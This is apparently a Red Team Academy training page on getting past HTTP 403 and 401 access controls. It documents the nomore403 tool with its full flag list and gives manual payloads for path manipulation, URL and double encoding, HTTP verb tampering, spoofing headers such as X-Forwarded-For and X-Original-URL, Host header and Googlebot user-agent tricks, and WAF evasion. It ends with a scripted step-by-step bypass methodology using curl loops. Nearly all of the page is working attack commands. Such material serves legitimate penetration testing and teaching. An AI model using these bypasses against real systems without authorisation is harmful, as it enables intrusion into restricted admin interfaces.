---
layout: training-page
title: "403 / 401 Bypass Techniques — Red Team Academy"
module: "Web Hacking"
tags:
  - 403
  - 401
  - access-control
  - bypass
  - headers
  - path-manipulation
  - verb-tampering
  - web-hacking
page_key: "web-403-bypass"
render_with_liquid: false
---

# 403 / 401 Bypass Techniques

HTTP 403 (Forbidden) and 401 (Unauthorized) responses are often bypassable via header injection, HTTP verb tampering, path manipulation, encoding tricks, and protocol version changes. This page covers manual techniques and the `nomore403` automated tool.

## nomore403 — Automated 403 Bypass Tool

`nomore403` is a Go-based tool that automates all major bypass techniques: verb tampering, header injection, path manipulation, double-encoding, HTTP version switching, and path case changes.

### Installation

```
# From releases (recommended)
# Download from: github.com/devploit/nomore403/releases

# Compile from source
git clone https://github.com/devploit/nomore403
cd nomore403
go get
go build
```

### Basic Usage

```
# Basic scan — run all bypass techniques
./nomore403 -u https://domain.com/admin

# Output example:
# 200     2047 bytes https://domain.com/;///..admin      (path manipulation)
# 200     2047 bytes https://domain.com/%61dmin          (path case switching)

# Verbose mode + route through Burp
./nomore403 -u https://domain.com/admin -x http://127.0.0.1:8080 -v

# Only run specific techniques
./nomore403 -u https://domain.com/admin -k headers,http-versions

# Parse a Burp-captured request file
./nomore403 --request-file request.txt

# Add custom header + specific bypass IP
./nomore403 -u https://domain.com/admin -H "Environment: Staging" -b 8.8.8.8

# Rate limit detection + delay between requests
./nomore403 -u https://domain.com/admin -l -d 200

# Limit goroutines (lower number = stealthier)
./nomore403 -u https://domain.com/admin -m 5 -d 500

# Filter output — only show 200s
./nomore403 -u https://domain.com/admin --status 200

# Follow redirects
./nomore403 -u https://domain.com/admin -r

# Random User-Agent
./nomore403 -u https://domain.com/admin --random-agent
```

### All Flags

```
./nomore403 -h

  -u, --uri string            Target URL
  -k, --technique strings     Techniques: verbs,verbs-case,headers,endpaths,midpaths,double-encoding,http-versions,path-case
  -H, --header strings        Add custom header(s) — repeatable
  -b, --bypass-ip string      IP to inject in X-Forwarded-For and similar headers
  -x, --proxy string          Proxy URL (e.g. http://127.0.0.1:8080)
  -t, --http-method string    HTTP method (default: GET)
  -d, --delay int             Delay between requests in ms
  -m, --max-goroutines int    Max concurrent goroutines (default: 50)
  -l, --rate-limit            Stop on 429 responses
  -r, --redirect              Follow redirects
  -v, --verbose               Verbose output
      --status strings        Filter by comma-separated status codes
      --request-file string   Load request from file
      --random-agent          Use random User-Agent
      --timeout int           Request timeout in ms (default: 6000)
      --unique                Show unique results by status + length
      --no-banner             Suppress startup banner
      --http                  Use HTTP instead of HTTPS for request files
```

## Manual Bypass Techniques

### Path Manipulation

```
# Append or prepend characters to confuse path parsing
https://domain.com/admin/../admin
https://domain.com/./admin
https://domain.com//admin
https://domain.com/admin/
https://domain.com/admin/.
https://domain.com/;///..admin
https://domain.com/admin..;/
https://domain.com/%2fadmin
https://domain.com/admin%20
https://domain.com/admin%09
https://domain.com/admin#

# Add extra path segments
https://domain.com/admin/index.php
https://domain.com/admin/fake/../admin
https://domain.com/anything/../admin

# Double slash
https://domain.com//admin//
```

### URL Encoding

```
# Single encode path
https://domain.com/%61dmin          # %61 = 'a'
https://domain.com/adm%69n          # %69 = 'i'
https://domain.com/%61%64%6d%69%6e  # Full "admin" encoded

# Double encode
https://domain.com/%2561dmin        # %25 = %, so %2561 = %61 = a

# Unicode encoding
https://domain.com/\u0061dmin
https://domain.com/%c0%aedmin       # overlong UTF-8

# Mixed case (some servers are case-insensitive)
https://domain.com/ADMIN
https://domain.com/Admin
https://domain.com/AdMin
```

### HTTP Verb Tampering

```
# Try different HTTP methods on the same path
curl -X POST https://domain.com/admin
curl -X PUT https://domain.com/admin
curl -X PATCH https://domain.com/admin
curl -X DELETE https://domain.com/admin
curl -X OPTIONS https://domain.com/admin
curl -X HEAD https://domain.com/admin
curl -X TRACE https://domain.com/admin
curl -X CONNECT https://domain.com/admin

# Use X-HTTP-Method-Override header (some frameworks respect this)
curl -X POST https://domain.com/admin -H "X-HTTP-Method-Override: GET"
curl -X POST https://domain.com/admin -H "X-Method-Override: GET"
```

### Header Injection for IP Bypass

```
# Access control based on IP — inject internal/trusted IPs
curl https://domain.com/admin -H "X-Forwarded-For: 127.0.0.1"
curl https://domain.com/admin -H "X-Forwarded-For: 10.0.0.1"
curl https://domain.com/admin -H "X-Forwarded-For: 192.168.1.1"
curl https://domain.com/admin -H "X-Forwarded-For: localhost"

# Other IP spoofing headers
curl https://domain.com/admin -H "X-Real-IP: 127.0.0.1"
curl https://domain.com/admin -H "X-Client-IP: 127.0.0.1"
curl https://domain.com/admin -H "X-Remote-IP: 127.0.0.1"
curl https://domain.com/admin -H "X-Remote-Addr: 127.0.0.1"
curl https://domain.com/admin -H "X-Original-URL: /admin"
curl https://domain.com/admin -H "X-Rewrite-URL: /admin"
curl https://domain.com/admin -H "X-Custom-IP-Authorization: 127.0.0.1"
curl https://domain.com/admin -H "True-Client-IP: 127.0.0.1"
curl https://domain.com/admin -H "Client-IP: 127.0.0.1"

# Combine multiple headers
curl https://domain.com/admin \
  -H "X-Forwarded-For: 127.0.0.1" \
  -H "X-Original-URL: /admin" \
  -H "X-Forwarded-Host: localhost"
```

### HTTP Protocol Version

```
# Try HTTP/1.0 (older protocol — may skip some checks)
curl --http1.0 https://domain.com/admin

# HTTP/2
curl --http2 https://domain.com/admin

# HTTP/3 (QUIC)
curl --http3 https://domain.com/admin
```

### Host Header Manipulation

```
# Override routing via Host header (useful for virtual hosting / proxy bypass)
curl https://domain.com/admin -H "Host: localhost"
curl https://domain.com/admin -H "Host: 127.0.0.1"
curl https://domain.com/admin -H "Host: internal.domain.com"

# X-Forwarded-Host
curl https://domain.com/admin -H "X-Forwarded-Host: localhost"
curl https://domain.com/admin -H "X-Original-Host: localhost"
```

### Referer / User-Agent Tricks

```
# Some endpoints check Referer for access
curl https://domain.com/admin -H "Referer: https://domain.com/admin"
curl https://domain.com/admin -H "Referer: https://domain.com/"

# Googlebot / other trusted User-Agents
curl https://domain.com/admin -H "User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)"
curl https://domain.com/admin -H "User-Agent: Mozilla/5.0 (compatible; bingbot/2.0)"
```

### Content-Type Manipulation

```
# Some access checks skip content-type specific parsers
curl -X POST https://domain.com/admin \
  -H "Content-Type: application/json" \
  -d '{}'

curl -X POST https://domain.com/admin \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "param=value"
```

## WAF / Rate Limit Evasion

```
# Add noise headers to confuse WAF signature matching
curl https://domain.com/admin \
  -H "X-Random-Header: $(openssl rand -hex 8)" \
  -H "Accept-Language: en-US,en;q=0.5"

# Fragment the request (HTTP Chunked Transfer Encoding)
curl https://domain.com/admin -H "Transfer-Encoding: chunked"

# Add padding to reach/miss WAF size thresholds
# Some WAFs skip inspection on large requests
```

## 403 Bypass Methodology

```
# Step 1: Run nomore403 with all techniques
./nomore403 -u https://target.com/admin --unique

# Step 2: If that fails, try manual path tricks
for path in '/admin/' '/admin/.' '/;admin' '/%2fadmin' '/admin%20'; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "https://target.com$path")
  echo "$code $path"
done

# Step 3: Try IP spoofing headers
for header in "X-Forwarded-For" "X-Real-IP" "X-Client-IP" "True-Client-IP"; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "https://target.com/admin" -H "$header: 127.0.0.1")
  echo "$code $header: 127.0.0.1"
done

# Step 4: Verb tamper
for verb in GET POST PUT PATCH DELETE HEAD OPTIONS; do
  code=$(curl -s -o /dev/null -w "%{http_code}" -X $verb "https://target.com/admin")
  echo "$code $verb"
done

# Step 5: Check if 403 is from WAF vs app — bypass WAF IP
# Resolve the real IP of the target and send directly
host target.com
curl -s "https://REAL_IP/admin" -H "Host: target.com"
```

## Resources

- nomore403 — `github.com/devploit/nomore403`
- PortSwigger Access Control Labs — `portswigger.net/web-security/all-labs#access-control-vulnerabilities`
- OWASP Testing Guide — Access Control — `owasp.org/www-project-web-security-testing-guide/`
- 403 Bypass Cheat Sheet — HackTricks — `book.hacktricks.xyz/network-services-pentesting/pentesting-web/403-and-401-bypasses`
- Bypass 403 — github.com/iamj0ker/bypass-403
